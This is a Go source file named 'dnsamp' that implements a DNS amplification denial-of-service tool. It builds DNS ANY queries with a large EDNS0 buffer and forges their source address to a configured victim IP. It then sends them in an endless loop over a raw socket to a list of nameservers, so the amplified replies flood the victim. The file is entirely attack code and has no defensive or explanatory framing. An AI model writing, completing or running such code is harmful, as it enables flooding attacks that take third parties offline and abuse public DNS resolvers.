package dnsamp

import (
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"

	"golang.org/x/net/ipv4"
    "github.com/miekg/dns"
)


type Target struct {
    DomainName string
    NameServer string
}

const SRC_PORT = 80

var options = gopacket.SerializeOptions{
        ComputeChecksums: true,
        FixLengths:       true,
}
var netIface string
var targetIP net.IP

func Configure(iface string, target net.IP) {
    netIface = iface
    targetIP = target
}

// create ANY request packet
func makePacket(domainName string, nameserverIP net.IP) (*layers.IPv4, []byte) {
    ip := layers.IPv4{
        SrcIP:    targetIP,
        DstIP:    nameserverIP,
        Protocol: layers.IPProtocolUDP,
        Version:  4,
        TTL:      64,
    }
    udp := layers.UDP{
        SrcPort: SRC_PORT,
        DstPort: 53,
    }
    udp.SetNetworkLayerForChecksum(&ip)

    // Create a new DNS message using the miekg/dns package
    m := new(dns.Msg)
    m.SetQuestion(dns.Fqdn(domainName), dns.TypeANY)
    m.RecursionDesired = true
    m.Id = dns.Id()

    // Set the EDNS0 UDP payload size
    edns0 := new(dns.OPT)
    edns0.Hdr.Name = "."
    edns0.Hdr.Rrtype = dns.TypeOPT
    edns0.SetUDPSize(4096)
    m.Extra = append(m.Extra, edns0)

    // Serialize the DNS message to bytes
    dnsBytes, err := m.Pack()
    if err != nil {
        panic(err)
    }

    buffer := gopacket.NewSerializeBuffer()
    if err := gopacket.SerializeLayers(buffer, options,
        &udp,
        gopacket.Payload(dnsBytes),
    ); err != nil {
        panic(err)
    }
    return &ip, buffer.Bytes()
}

func Send(servers []Target) {
    c, err := net.ListenPacket("ip4:udp", "")
    if err != nil {
        panic(err)
    }
    conn, err := ipv4.NewRawConn(c)
    if err != nil {
        panic(err)
    }
    defer conn.Close()
    // Send packets forever
    for {
        for _, server := range servers {
            nameserverIP := net.ParseIP(server.NameServer)
            // Ignore invalid lines in the file
            if nameserverIP != nil {
                ip, payload := makePacket(server.DomainName, nameserverIP)
                ip.SrcIP = targetIP
                ipHeaderBuf := gopacket.NewSerializeBuffer()
                err := ip.SerializeTo(ipHeaderBuf, options)
                if err != nil {
                    panic(err)
                }
                ipHeader, err := ipv4.ParseHeader(ipHeaderBuf.Bytes())
                if err != nil {
                    panic(err)
                }
                // IP header src does not get used for some reason
                err = conn.WriteTo(ipHeader, payload, nil)
                if err != nil {
                    panic(err)
                }
            }
        }
    }
}
